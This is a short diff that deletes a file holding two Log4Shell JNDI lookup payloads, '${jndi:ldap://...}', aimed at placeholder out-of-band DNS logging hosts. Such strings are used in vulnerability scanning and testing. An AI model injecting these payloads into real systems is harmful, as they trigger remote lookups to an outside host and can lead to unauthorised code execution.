@@ -1,3 +1,0 @@
-${jndi:ldap://xxxxxx.dnslog.cn}
-${jndi:ldap://xxxxxx.ceye.io}
-
